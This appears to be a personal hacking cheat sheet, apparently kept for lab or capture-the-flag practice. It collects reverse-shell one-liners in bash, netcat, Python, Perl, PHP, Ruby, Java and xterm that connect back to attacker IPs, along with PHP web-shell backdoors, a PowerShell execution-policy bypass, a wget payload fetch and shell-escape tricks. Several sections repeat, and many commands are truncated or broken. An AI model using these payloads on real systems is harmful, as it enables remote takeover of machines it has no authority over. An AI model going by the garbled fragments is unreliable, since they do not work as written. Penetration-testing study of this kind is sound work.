---
tags: 🔻 🔻/shell
aliases: Hacking Notes
---

# Shell

[ttps://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors](https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors)  
[http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)  
[http://pentestmonkey.net/tools/web-shells/php-findsock-shell](http://pentestmonkey.net/tools/web-shells/php-findsock-shell)  
[https://github.com/b374k/b374k](https://github.com/b374k/b374k)  
[https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1)  
  
 ### quick reverse shell scripts
 
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.13.142 4444 >/tmp/f`
  
`echo "rm -rf /tmp/p; mknod /tmp/p p; /bin/sh 0</tmp/p | nc x.x.x.x ` 
  
`/bin/nc -e /bin/bash x.x.x.x ` 
  
  
  
## Reverse Shells  
### Bash

Some versions of [bash can send you a reverse shell] 

#bash_shell 
[with thm vpn ip in]
`bash -i >& /dev/tcp/10.11.13.142/8080 0>&1`
  
alternative 
`bash -i >& /dev/tcp/x.x.x.x`  
  
  
#netcat without -e flag  
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x`  
  
  
#netcat Linux  
`nc -e /bin/sh x.x.x.x`  
  
  
#netcat Windows  
`nc -e cmd.exe x.x.x.x`  
  
  
#Python  
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("x.x.x.x))`  
  
  
#Perl  
`perl -e 'use Socket;$i="x.x.x.x ` 

  
Remote Desktop

Remote Desktop for windows with share and 85% screen  
  
`rdesktop -u username -p password -g 85% -r disk:share=/root/ x.x.x.x ` 
  
#PHP  
  
PHP command injection from GET Request  
`<?php echo system($\_GET\["cmd"\]);?>`  
  
Alternative  
`<?php echo shell\_exec($\_GET\["cmd"\]);?>`  
  
#Powershell  
Non-interactive execute powershell file  
`powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1  `
  
Misc  
  
More binaries Path  
`export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/ucb/  `
  
  
  

====================================  
  
Reverse Shells  
#Bash shell  
`bash -i >& /dev/tcp/x.x.x.x`  
  
  
#netcat without -e flag  
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x`  

  
#netcat Linux  
`nc -e /bin/sh x.x.x.x  
`  
  
#netcat Windows  
`nc -e cmd.exe x.x.x.x  
`  
  
#Python  
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x  
`  
  
#Perl  
`perl -e 'use Socket;$i="x.x.x.x  
`  
  
Remote Desktop  
Remote Desktop for windows with share and 85% screen  
`rdesktop -u username -p password -g 85% -r disk:share=/root/ x.x.x.x  
`  
  
#PHP  
PHP command injection from GET Request  
`<?php echo system($_GET["cmd"]);?>`  
  
Alternative  
`<?php echo shell_exec($_GET["cmd"]);?>`  
  
#Powershell  
Non-interactive execute powershell file  
`powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1  
`  
  
  
Misc  
More binaries Path  
`export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/ucb/`  
    
#curl Shell  
\[curl -s –data “cmd=wget [http://](http://174.0.42.42:8000/dhn%C2%A0-O)x.x.x.x


# Different Shells
#shell 

echo os.system('/bin/bash')  
  
/bin/sh -i  
  
perl —e 'exec "/bin/sh";'  
  
perl: exec "/bin/sh";  
  
lua: os.execute('/bin/sh')  
  
IRB: exec "/bin/sh  
  
vi: :!bash  
  
:set shell=/bin/bash:shell  
  
vim ':!bash'

# Windows Shell
#windows_shell

[https://github.com/Dhayalanb/windows-php-reverse-shell](https://github.com/Dhayalanb/windows-php-reverse-shell)

### xterm
#xterm

One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.

xterm -display 10.0.0.1:1

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):

Xnest :1

You’ll need to authorise the target to connect to you (command also run on your host):

xhost +targetip



### PERL

Here’s a shorter, feature-free version of the [perl-reverse-shell]


perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

There’s also an [alternative PERL revere shell here]

### Python

This was tested under Linux / Python 2.7:

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'

### PHP

This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…

php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

If you want a .php file to upload, see the more featureful and robust [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

### Ruby

ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to\_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

### Netcat

Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.

nc -e /bin/sh 10.0.0.1 1234

If you have the wrong version of netcat installed, [Jeff Price points out here](http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498) that you might still be able to get your reverse shell back like this:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

### Java

r = Runtime.getRuntime()
p = r.exec(\["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done"\] as String\[\])
p.waitFor()

\[Untested submission from anonymous reader\]